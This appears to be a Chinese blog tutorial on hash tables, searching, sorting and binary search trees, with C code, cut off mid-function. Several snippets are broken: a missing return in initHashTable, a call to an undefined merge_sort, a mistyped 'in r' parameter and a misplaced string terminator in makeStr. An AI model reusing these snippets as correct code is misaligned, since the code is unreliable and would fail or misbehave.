patterns","slug":"design-patterns","permalink":"https://racleray.github.io/tags/design-patterns/"}],"author":"HeRui"},{"title":"数据结构整理-part2","slug":"数据结构整理-part2","date":"2021-10-08T13:30:33.000Z","updated":"2023-08-07T11:54:31.042Z","comments":true,"path":"posts/4121feda.html","link":"","permalink":"https://racleray.github.io/posts/4121feda.html","excerpt":"常见基本数据结构整理第二部分，使用C语言编写。","text":"哈希表 将key的值通过一个设计好的hash函数转换，在连续内存地址上寻址找到对应的值。 hash函数构造方法： 直接寻址法：将key值线性的映射到存储地址上。少量key适用。 除留余数法：将key值对整数 p 取的余数直接做为存储地址。一般选择不大于 p 的最大质数。 字符串hash的 BKD hash。 ... hash函数设计要求计算简单，值尽量均匀分布。 冲突处理 开放地址法 如果发生冲突，那么就使用某种策略寻找下一存储地址，直到找到一个不冲突的地址或者找到关键字，否则一直按这种策略继续寻找。如果冲突次数达到了上限则终止程序，表示关键字不存在哈希表里。 线性探测法，如果当前的冲突位置为 \\(d\\)，那么接下来几个探测地址为 \\(d + 1\\)，\\(d + 2\\)，\\(d + 3\\) 等，也就是从冲突地址往后面一个一个探测； 线性补偿探测法，它形成的探测地址为 \\(d + m\\)，\\(d + 2 \\times m\\)，\\(d + 3 \\times m\\) 等，与线性探测法不同，这里的查找单位不是 \\(1\\)，而是 \\(m\\)，为了能遍历到哈希表里所有位置，设置 \\(m\\) 和表长 \\(size\\) 互质； 随机探测法，这种方法和前两种方法类似，这里的查找单位不是一个固定值，而是一个随机序列。 二次探测法，它形成的探测地址为 \\(d + 1^2\\)，\\(d - 1^2\\)，\\(d + 2^2\\)，\\(d - 2^2\\) 等，这种方法在冲突位置左右跳跃着寻找探测地址。 规定，当冲突次数小于表长的一半时，就可以把字符串插入到哈希表中。而如果发生冲突次数大于表长的一半时，就需要调用重建函数去重建哈希表了，因为认为哈希表已经发生了“堆聚”现象，这种情况下要扩大哈希表的容量，提高查找和插入的效率。 开放地址法计算简单快捷，处理起来方便，但是也存在不少缺点。 线性探测法容易形成“堆聚”的情况，即很多记录就连在一块，而且一旦形成“堆聚”，记录会越聚越多。 另外，开放地址法都有一个缺点，删除操作显得十分复杂，不能直接删除关键字所在的记录，否则在查找删除位置后面的元素时，可能会出现找不到的情况，因为删除位置上已经成了空地址，查找到这里时会终止查找。 链地址法 该方法将所有哈希地址相同的结点构成一个单链表，单链表的头结点存在哈希数组里。链地址法常出现在经常插入和删除的情况下。 相比开放地址法，链地址法有以下优点：不会出现“堆聚”现象，哈希地址不同的关键字不会发生冲突；不需要重建哈希表，在开放地址法中，如果哈希表里存满关键字了就需要扩充哈希表然后重建哈希表，而在链地址法里，因为结点都是动态申请的，所以不会出现哈希表里存满关键字的情况；相比开放地址法，关键字删除更方便，只需要找到指定结点，删除该结点即可。 当然代价就是查找效率会稍低一点，但是对于hash来讲这一点效率影响在大多数非极端条件下，使用体验基本没有啥区别。 当关键字规模少的时候，开放地址法比链地址法更节省空间，因为用链地址法可能会存在哈希数组出现大量空地址的情况，而在关键字规模大的情况下，链地址法就比开放地址法更节省空间，链表产生的指针域可以忽略不计，关键字多，哈希数组里产生的空地址就少了。 实现线性探测法hash 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct HashTable &#123; char **elem; int size;&#125; HashTable;void init(HashTable *h);int hash(HashTable *h, char value[]);int search(HashTable *h, char value[], int *pos, int *times);int insert(HashTable *h, char value[]);void recreate(HashTable *h);void init(HashTable *h) &#123; h-&gt;size = 2000; h-&gt;elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; h-&gt;elem[i] = NULL; &#125;&#125;int hash(HashTable *h, char value[]) &#123; int code = 0; for (size_t i = 0; i &lt; strlen(value); i++) &#123; code = (code * 256 + value[i] + 128) % h-&gt;size; &#125; return code;&#125;int search(HashTable *h, char value[], int *pos, int *times) &#123; *pos = hash(h, value); *times = 0; while (h-&gt;elem[*pos] != NULL &amp;&amp; strcmp(h-&gt;elem[*pos], value) != 0) &#123; (*times)++; if (*times &lt; h-&gt;size) &#123; *pos = (*pos + 1) % h-&gt;size; &#125; else &#123; return 0; &#125; &#125; if (h-&gt;elem[*pos] != NULL &amp;&amp; strcmp(h-&gt;elem[*pos], value) == 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;int insert(HashTable *h, char value[]) &#123; int pos, times; // pos在search函数结束时时待插入元素的位置，times为冲突计数 if (search(h, value, &amp;pos, &amp;times)) &#123; return 2; &#125; else if (times &lt; h-&gt;size / 2) &#123; h-&gt;elem[pos] = (char *)malloc(strlen(value) + 1); strcpy(h-&gt;elem[pos], value); return 1; &#125; else &#123; recreate(h); insert(h, value); return 0; &#125;&#125;// 当插入值的冲突数大于size的一半时，增大哈希表。void recreate(HashTable *h) &#123; // 获取原哈希表中元素 char **temp_elem; temp_elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; if (h-&gt;elem[i] != NULL) &#123; temp_elem[i] = (char *)malloc(strlen(h-&gt;elem[i]) + 1); strcpy(temp_elem[i], h-&gt;elem[i]); &#125; else &#123; temp_elem[i] = NULL; &#125; &#125; // 释放原哈希表中元素 for (int i = 0; i &lt; h-&gt;size; i++) &#123; if (h-&gt;elem[i] != NULL) &#123; free(h-&gt;elem[i]); &#125; &#125; free(h-&gt;elem); // 创建新哈希表 int copy_size = h-&gt;size; h-&gt;size = h-&gt;size * 2; h-&gt;elem = (char **)malloc(sizeof(char *) * h-&gt;size); for (int i = 0; i &lt; h-&gt;size; i++) &#123; h-&gt;elem[i] = NULL; &#125; for (int i = 0; i &lt; copy_size; i++) &#123; if (temp_elem[i] != NULL) &#123; insert(h, temp_elem[i]); &#125; &#125; // 释放内存 for (int i = 0; i &lt; copy_size; i++) &#123; if (temp_elem[i] != NULL) &#123; free(temp_elem[i]); &#125; &#125; free(temp_elem);&#125;void clear(HashTable *h) &#123; for (int i = 0; i &lt; h-&gt;size; ++i) &#123; if (h-&gt;elem[i] != NULL) &#123; free(h-&gt;elem[i]); &#125; &#125; free(h-&gt;elem); free(h);&#125;int main() &#123; HashTable *hashtable = (HashTable*)malloc(sizeof(HashTable)); init(hashtable); char buffer[1000]; int n; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%s\", buffer); int ans = insert(hashtable, buffer); if (ans == 0) &#123; printf(\"recreate while insert!\\n\"); &#125; else if (ans == 1) &#123; printf(\"insert success!\\n\"); &#125; else if (ans == 2) &#123; printf(\"It already exists!\\n\"); &#125; &#125; int temp_pos, temp_times; scanf(\"%s\", buffer); if (search(hashtable, buffer, &amp;temp_pos, &amp;temp_times)) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; clear(hashtable); return 0;&#125; 实现链地址法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;typedef struct Node &#123; char *str; struct Node *next;&#125; Node;typedef struct HashTable &#123; Node **data; int size;&#125; HashTable;Node *initNode(const char *str) &#123; Node *n = (Node *)malloc(sizeof(Node)); //n-&gt;str = (char *)malloc(strlen(str) + 1); //strcpy(n-&gt;str, str); // 等价操作 n-&gt;str = strdup(str); n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (!n) return; free(n-&gt;str); free(n); return;&#125;void freeList(Node *list) &#123; if (!list) return; Node *n; while (list) &#123; n = list; list = list-&gt;next; freeNode(n); &#125; return;&#125;HashTable *initHashTable(int size) &#123; HashTable *h = (HashTable *)malloc(sizeof(HashTable)); h-&gt;size = 2 * size; h-&gt;data = (Node **)calloc(h-&gt;size, sizeof(Node*));&#125;void freeHashTable(HashTable *h) &#123; if (!h) return; for (int i = 0; i &lt; h-&gt;size; i++) &#123; freeList(h-&gt;data[i]); &#125; free(h-&gt;data); free(h); return;&#125;Node *insertNode(Node *head, Node *p) &#123; p-&gt;next = head; return p;&#125;int BKDHash(const char *str) &#123; int seed = 11; // prime int hash = 0; while (*str) &#123; hash = hash * seed + str[0]; ++str; &#125; return hash &amp; 0x7fffffff;&#125;int insertHash(HashTable *h, const char *str) &#123; if (h == NULL) return 0; int hash = BKDHash(str); int idx = hash % h-&gt;size; h-&gt;data[idx] = insertNode(h-&gt;data[idx], initNode(str)); return 1;&#125;Node *searchList(Node *p, const char *str) &#123; while (p &amp;&amp; strcmp(p-&gt;str, str)) &#123; p = p-&gt;next; &#125; return p;&#125;Node *search(HashTable *h, const char *str) &#123; if (h == NULL) return NULL; int hash = BKDHash(str); int idx = hash % h-&gt;size; return searchList(h-&gt;data[idx], str);&#125;char *makeStr(char *str, int n) &#123; int len = rand() % (n - 1) + 1; char tmp; for (int i = 0; i &lt; len; i++) &#123; switch (rand() % 3) &#123; case 0: tmp = 'A' + rand() % 26; break; case 1: tmp = 'a' + rand() % 26; break; case 2: tmp = '0' + rand() % 10; break; &#125; str[i] = tmp; &#125; str[n] = '\\0'; // or str[n] = 0; return str;&#125;int main(void) &#123; srand(time(NULL)); #define N 10 char str[10]; int cnt = N; HashTable *h = initHashTable(N); while (cnt--) &#123; insertHash(h, makeStr(str, 10)); printf(\"%s \", str); &#125; putchar(10); // or putchar('\\n'); while (~scanf(\"%s\", str)) &#123; if (!strcmp(str, \"q\")) break; // q 退出 Node *node = search(h, str); if (node) printf(\"hash=%d addr=%p str=%s\\n\", BKDHash(str), node, node-&gt;str); else printf(\"%s not found\\n\", str); &#125; #undef N return 0;&#125; 查找表 用于查找的数据集合则称为 查找表（search table） 。查找表中的数据元素类型是一致的，并且有能够唯一标识出元素的 关键字（keyword） 。 通常对查找表有 4 种操作： 查找：在查找表中查看某个特定的记录是否存在 检索：查找某个特定记录的各种属性 插入：将某个不存在的数据元素插入到查找表中 删除：从查找表中删除某个特定元素 如果对查找表只执行前两种操作，则称这类查找表为 静态查找表（static search table） 。静态查找表建立以后，就不能再执行插入或删除操作，查找表也不再发生变化。比如顺序查找、折半查找、分块查找等。 对应的，如果对查找表还要执行后两种操作，则称这类查找表为 动态查找表（dynamic search table） 。对于动态查找表，往往使用二叉平衡树、B-树或哈希表来处理。 性能度量 使用 平均查找长度（average search length, ASL） 来衡量查找算法的性能。 假设每个元素时等概率分布，ASL就是所有元素被成功查找时，元素比较次数的期望。 通常平均查找长度，不考虑查找不成功的情况。 顺序查找 顺序查找（又称线性查找，sequential search） 是指在线性表中进行的查找算法。对于无序序列，查找成功的ASL为 \\(\\frac{n+1}{2}\\)。查找不成功ASL为 n。 对于有序序列，查找成功的ASL为 \\(\\frac{n+1}{2}\\)。查找不成功ASL为 \\(\\frac{n}{2} +\\frac{n}{n+1}\\)。 12345678910111213141516171819#include &lt;stdio.h&gt;int search(int *data, int length, int value) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (data[i] == value) &#123; return i; &#125; else if (data[i] &gt; value) &#123; return -1; &#125; &#125; return -1;&#125;int main() &#123; int a[5] = &#123;2, 4, 6, 8, 10&#125;; printf(\"%d\\n\", search(a, 5, 4)); printf(\"%d\\n\", search(a, 5, 5)); return 0;&#125; 折半查找 针对有序可随机寻址的顺序表结构，查找时间复杂度稳定下降为 \\(O(log(n))\\) 级别。 在定义端点下标时，决定了搜索区间的分布情况。右端定义为length - 1，搜索区间为闭区间。右端收缩为 mid - 1。右端定义为length，搜索区间为左闭右开，右端收缩为 mid。 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int search(int *data, int length, int value) &#123; int left = 0, right = length - 1; while (left &lt;= right) &#123; int mid = (left + right) / 2; if (data[mid] == value) &#123; return mid; &#125; else if (data[mid] &lt; value) &#123; left = mid + 1; &#125; else &#123; right = mid - 1; &#125; &#125; return -1;&#125;int main() &#123; int a[5] = &#123;2, 4, 6, 8, 10&#125;; printf(\"%d\\n\", search(a, 5, 10)); printf(\"%d\\n\", search(a, 5, 5)); return 0;&#125; 搜索排好序的序列中某重复元素第一个出现位置的问题。 123456789101112int search(int *data, int length, int value) &#123; int left = 0, right = length; // 处理不存在目标情况 while (left &lt; right) &#123; int mid = (left + right) / 2; if (data[mid] == value) &#123; right = mid; // 收缩到第一个出现位置 &#125; else &#123; left = mid + 1; &#125; &#125; return right != length ? left : -1; // 处理不存在目标情况&#125; 搜索排好序的序列中某重复元素最后一个出现位置的问题。 123456789101112int search(int *data, int length, int value) &#123; int left = -1, right = length - 1; // left = -1 处理不存在目标情况 while (left &lt; right) &#123; int mid = (left + right + 1) / 2; // 保证left不会恒定为一个值，所以 + 1 if (data[mid] == value) &#123; left = mid; // 收缩到第一个出现位置 &#125; else &#123; right = mid - 1; &#125; &#125; return left; // 不存在返回 -1&#125; 三分查找 适合序列具有凸性的情况，某一点两侧分别是单调的。 首先将区间 \\([L, R]\\) 平均分成三部分：\\([L, m_1]\\)、\\([m_1, m_2]\\)、\\([m_2, R]\\)。 计算三等分点 \\(m_1\\) 和 \\(m_2\\) 对应的函数值 \\(f(m_1)\\) 和 \\(f(m_2)\\)。 比较 \\(f(m_1)\\) 和 \\(f(m_2)\\) 的大小。 如果 \\(f(m_1) &gt; f(m_2)\\)，则说明点 \\(T\\) 一定不在区间 \\([m_2, R]\\) 内，可以把右边界 \\(R\\) 更新成 \\(m_2\\)； 如果 \\(f(m_1) &lt; f(m_2)\\)，则说明点 \\(T\\) 一定不在区间 \\([L, m_1]\\) 内，可以把左边界 \\(L\\) 更新成 \\(m_1\\)； 如果 \\(f(m_1) = f(m_2)\\)，则说明点 \\(T\\) 一定落在区间 \\([m_1, m_2]\\) 内。另外，可以将这种情况归为上面两种情况的任一一种。 重复以上操作，不断缩小查找区间，直到在精度要求的范围内，左边界 \\(L\\) 等于右边界 \\(R\\)，这时的边界点 \\((L, f(L))\\) 或者 \\((R, f(R))\\) 即是查找的极大值点 \\(T\\)。 同理，如果求凹性函数的极小值点，只需要在第三步中，将大于号和小于号反向变化一下即可。 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int find_max(int *data, int length) &#123; int left = 0, right = length - 1; while (right - left &gt;= 2) &#123; int m1 = left + (right - left) / 3; int m2 = right - (right - left + 2) / 3; if (data[m1] &gt;= data[m2]) &#123; right = m2; &#125; else &#123; left = m1 + 1; &#125; &#125; if (data[left] &gt; data[right]) &#123; return left; &#125; else &#123; return right; &#125;&#125;int main() &#123; int a[5] = &#123;1, 2, 7, 5, 4&#125;; printf(\"%d\\n\", find_max(a, 5)); return 0;&#125; 分块查找 分块查找（Blocking Search）的基本思想是将一个线性表分成若干个子表，在查找时，先确定目标元素所在的子表再在该子表中去查找它。 分块查找也被叫做 索引顺序查找 ，在分块查找方法中，需要建立一个 索引表 。索引表中包含两类信息：关键字和指针。关键字指的每个子表中最大的关键字，指针则表示该子表中第一个元素在整个表中的下标。 分块查找要求整个线性表是分块有序的。第 i 个子表中最大的关键字小于第 i+1 个子表中最小的关键字。 而在每一个子表中，元素的排列是随意的，只能通过顺序查找的方法在子表中完成最终的查找工作。 分块查找的效率是基于顺序查找和折半查找之间的。先搜索引，再顺序搜索子表。 分块查找的优势在于，由于子块中的元素是随意排序的，只要找到对应的块就能直接进行插入和删除操作，而不用大量移动其它的元素，因此它适用于线性表需要频繁的动态变化的情况。 分块查找的缺点则在于它需要一定的内存空间来存放索引表并且要求对索引表进行排序。 C++ STL中的deque就是使用这种分块的“连续”结构设计思路。 排序 根据算法的时间复杂度，可以将排序算法分为复杂度为 \\(O(n^2),\\ O(n\\log(n)),\\ O(n)\\)等时间复杂度的排序算法。比如 \\(O(n)\\) 的 基数排序（radix sort）、 \\(O(n\\log(n))\\)的归并排序、\\(O(n^2)\\)的冒泡排序。 根据排序过程中元素是否完全保存在内存中，可以将算法分为 内部排序（internal sort） 和 外部排序（external sort） 。 对于一个排序算法，如果任意两个元素 \\(a_i\\) 和 \\(a_j\\) 在排序前的线性表中满足条件 i&lt;j 且 \\(a_i = a_j\\)，在排序后 \\(a_i\\) 仍在 \\(a_j\\) 之前，则称这个排序算法为 稳定排序（stable sort） (比如插入、冒泡、归并)，否则称这个排序算法为 不稳定排序(unstable sort) （选择、快速、堆、希尔排序）。 插入排序 将线性表分为已排序的前半部分和待排序的后半部分，从待排序部分选出第一个元素，插入到已排序部分的对应位置中，直到全部记录都插入到已排序部分中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; for (int j = i - 1; j &gt;= 0; --j) &#123; if (data[j] &gt; data[j + 1]) &#123; swap(&amp;data[j], &amp;data[j + 1]); &#125; else &#123; break; &#125; &#125; &#125;&#125;void sort_better(int *data, int length) &#123; int cur; for (int i = 1; i &lt; length; i++) &#123; cur = data[i]; int j = i - 1; while (j &gt;= 0 &amp;&amp; data[j] &gt; cur) &#123; data[j + 1] = data[j]; j--; &#125; data[j + 1] = cur; &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; 冒泡排序 从前往后两两比较相邻元素的关键字， 按照目标大小顺序进行交换元素，每趟交换以后最后一个元素一定是最大的，不再参与下一趟交换。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; for (int i = 0; i &lt; length - 1; ++i) &#123; int swapped = 0; for (int j = 0; j &lt; length - i - 1; ++j) &#123; if (data[j] &gt; data[j + 1]) &#123; swap(&amp;data[j], &amp;data[j + 1]); swapped = 1; &#125; &#125; if (swapped == 0) &#123; break; &#125; &#125;&#125;void sort_better(int *data, int len) &#123; int isSorted = 0; do &#123; isSorted = 1; len--; for (int i=0; i&lt;len; ++i) &#123; if (data[i] &gt; data[i+1]) &#123; isSorted = 0; swap(&amp;data[i], &amp;data[i+1]); &#125; &#125; &#125; while (!isSorted);&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; 归并排序 设法将两个有序的线性表组合成一个新的有序线性表。为了实现归并操作，每次合并都需要开辟额外的空间来临时保存合并后的排序结果，总共需要开辟 n 个元素的空间，所以归并排序的空间复杂度为 \\(O(n)\\)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void mergesort(int *data, int l, int r) &#123; if (l == r) return; int mid = (l + r) / 2; mergesort(data, l, mid); mergesort(data, mid + 1, r); int temp[r - l + 1]; // 或者从堆分配空间 int x = l, y = mid + 1, loc = 0; while (x &lt;= mid || y &lt;= r) &#123; if (x &lt;= mid &amp;&amp; (y &gt; r || data[x] &lt;= data[y])) temp[loc] = data[x++]; else temp[loc] = data[y++]; loc++; &#125; for (int i = l; i &lt;= r; i++) &#123; data[i] = temp[i - l]; &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; merge_sort(arr, 0, n - 1); print(arr, n); return 0;&#125; 选择排序 选择排序，每趟从线性表的待排序区域选取关键字最小的元素，将其放到已排序区域的最后。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;inline void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; int temp; for (int i = 0; i &lt; length - 1; ++i) &#123; temp = i; for (int j = i + 1; j &lt; length; ++j) &#123; if (data[temp] &gt; data[j]) &#123; temp = j; &#125; &#125; if (i != temp) &#123; swap(&amp;data[i], &amp;data[temp]); &#125; &#125;&#125;void sort_better(int *data, int len) &#123; if (len &lt;= 1) return; register int *last = data + len - 1, *p, *minPtr; for ( ; data &lt; last; ++data) &#123; minPtr = data; for (p = data + 1; p &lt;= last; ++p) &#123; if (*p &lt; *minPtr) minPtr = p; &#125; swap(minPtr, data); &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; 在每次查找关键字最小的元素时，可以使用堆对效率进行优化，使用堆来优化的选择排序就是堆排序。 快速排序 快速排序是目前应用最广泛的排序算法之一。它的基本思想是，每次从待排序区间选取一个元素（在后面的课程中都是选取第一个）作为基准记录，所有比基准记录小的元素都在基准记录的左边，而所有比基准记录大的元素都在基准记录的右边。之后分别对基准记录的左边和右边两个区间进行快速排序，直至将整个线性表排序完成。 quick_sort_better 实现了单边递归，将两个递归函数，优化成一个。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void quick_sort(int *data, int left, int right) &#123; if (left &gt; right) &#123; return; &#125; int pivot = data[left], low = left, high = right; while (low &lt; high) &#123; while (low &lt; high &amp;&amp; data[high] &gt;= pivot) &#123; high--; &#125; data[low] = data[high]; while (low &lt; high &amp;&amp; data[low] &lt;= pivot) &#123; low++; &#125; data[high] = data[low]; &#125; data[low] = pivot; quick_sort(data, left, low - 1); quick_sort(data, low + 1, right);&#125;// quick sort 优化void quick_sort_better(int *data, int l, in r) &#123; if (l &gt;= r) return; while (l &lt; r) &#123; int x = l, y = r, pivot = data[(x + (y - x)) / 2]; while (x &lt;= y) &#123; while (data[x] &lt; pivot) ++x; while (data[y] &gt; pivot) --y; if (x &lt;= y) &#123; swap(&amp;data[x++], &amp;data[y--]); &#125; &#125; quick_sort_better(data, l, y); l = x; // 直接在当前函数内，快排后半部分 &#125; return;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; quick_sort(arr, 0, n - 1); print(arr, n); return 0;&#125; 二叉查找树 对任意结点，如果左子树不为空，则左子树上所有结点的权值都小于该结点的权值；如果右子树不为空，则右子树上所有结点的权值都大于该结点的权值。 如果中序遍历二叉查找树，会得到一个从小到大的序列。 在二叉查找树的基础上可以加些优化，可以让其成为 AVL 树，红黑树，SBT，Splay 等等，这些高级的树结构解决了二叉树退化的问题。 插入过程： 根节点为空则新元素直接作为根节点，否则传入的参数 value 与根节点进行比较。 value 等于当前节点则直接返回，小于则跳转到步骤 3，而如果 value 大于当前节点时，跳转到步骤 4。 判断当前节点是否存在左孩子，如果存在则让其左孩子继续调用插入方法，回到步骤 2，如果不存在则将新元素插入到当前节点的左孩子位置上。 判断当前节点是否存在右孩子，存在则让其右子树继续调用插入方法，回到步骤 2，不存在则将新元素插入到当前节点的右孩子位置上。 简单实现插入和查找，输出中序遍历结果。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild, *father;&#125;Node;Node* init(int data, Node *father) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; node-&gt;father = father; return node;&#125;Node* insert(int value, Node *tree) &#123; if (!tree) &#123; tree = init(value, NULL); return tree; &#125; if (value &gt; tree-&gt;data) &#123; if (!tree-&gt;rchild) tree-&gt;rchild = init(value, tree); else tree-&gt;rchild = insert(value, tree-&gt;rchild); &#125; else &#123; if (!tree-&gt;lchild) tree-&gt;lchild = init(value, tree); else tree-&gt;lchild = insert(value, tree-&gt;lchild); &#125; return tree;&#125;Node* search(int value, Node *tree) &#123; if (!tree || value == tree-&gt;data) return tree; if (value &gt; tree-&gt;data) &#123; if (!tree-&gt;rchild) return NULL; else return search(value, tree-&gt;rchild); &#125; else &#123; if (!tree-&gt;lchild) return NULL; else return search(value, tree-&gt;lchild); &#125;&#125;void inorder(Node *tree) &#123; if (!tree) return; inorder(tree-&gt;lchild); printf(\"%d \", tree-&gt;data); inorder(tree-&gt;rchild);&#125;void clear(Node *node) &#123; if (node != NULL) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; Node *binarytree = NULL; init(100, binarytree); int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; ++i) &#123; int v; scanf(\"%d\", &amp;v); binarytree = insert(v, binarytree); &#125; int value; scanf(\"%d\", &amp;value); if (search(value, binarytree)) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; (void)inorder(binarytree); clear(binarytree); return 0;&#125; 删除操作 节点的前驱指的是值比它小的节点中最大的一个节点，后继是指值比它大的节点中最小的一个。 查找节点前驱的算法流程如下： 找到当前节点的左孩子，如果当前节点没有左孩子则不存在前驱，若存在，则找到其左孩子的右孩子。 若当前节点有右孩子则继续找到其右孩子，重复步骤 2，直至找到一个节点不存在右孩子时，那么它就是要查找的前驱。 删除操作的算法流程如下： 找到被删除的节点。 若它存在左孩子，则找到他的前驱，用前驱替换被删除节点的值，再调用删除节点的方法删除前驱。 若被删除节点不存在左孩子，则找到它的后继，用后继替换被删除节点的值，再调用删除节点的方法删除后继。 若被删除的节点不存在孩子节点，直接调用删除节点的的方法删除它。 实现删除 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Node &#123; int data; struct Node *lchild, *rchild, *father;&#125;Node;Node* init(int _data, Node *_father) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = _data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; node-&gt;father = _father; return node;&#125;Node* insert(Node *node, int value) &#123; if (node == NULL) &#123; node = init(value, NULL); &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NULL) &#123; node-&gt;rchild = init(value, node); &#125; else &#123; node-&gt;rchild = insert(node-&gt;rchild, value); &#125; &#125; else if (value &lt; node-&gt;data) &#123; if (node-&gt;lchild == NULL) &#123; node-&gt;lchild = init(value, node); &#125; else &#123; node-&gt;lchild = insert(node-&gt;lchild, value); &#125; &#125; return node;&#125;Node* search(Node *node, int value) &#123; if (node == NULL || node-&gt;data == value) &#123; return node; &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NULL) &#123; return NULL; &#125; else &#123; return search(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NULL) &#123; return NULL; &#125; else &#123; return search(node-&gt;lchild, value); &#125; &#125;&#125;Node* predecessor(Node *node) &#123; if (!node-&gt;lchild) return NULL; Node *res = node-&gt;lchild; while (res &amp;&amp; res-&gt;rchild) &#123; res = res-&gt;rchild; &#125; return res;&#125;Node* successor(Node *node) &#123; if (!node-&gt;rchild) return NULL; Node *res = node-&gt;rchild; while (res &amp;&amp; res-&gt;lchild) &#123; res = res-&gt;lchild; &#125; return res;&#125;// 删除度为1或者0的节点，在delete_tree函数中使用。void remove_node(Node *node) &#123; if (!node) return; Node *tmp = NULL; if (node-&gt;lchild) &#123; tmp = node-&gt;lchild; tmp-&gt;father = node-&gt;father; &#125; if (node-&gt;rchild) &#123; tmp = node-&gt;rchild; tmp-&gt;father = node-&gt;father; &#125; if (node-&gt;father-&gt;lchild == node) &#123; node-&gt;father-&gt;lchild = tmp; &#125; else &#123; node-&gt;father-&gt;rchild = tmp; &#125; node-&gt;rchild = NULL; node-&gt;lchild = NULL; node-&gt;father = NULL; free(node);&#125;// 根据输入值删除节点int delete_tree(Node *tree, int value) &#123; if (!tree) return ERROR; Node *target = search(tree, value); if (!target) return ERROR; Node *tmp = NULL; if (target-&gt;lchild) &#123; tmp = 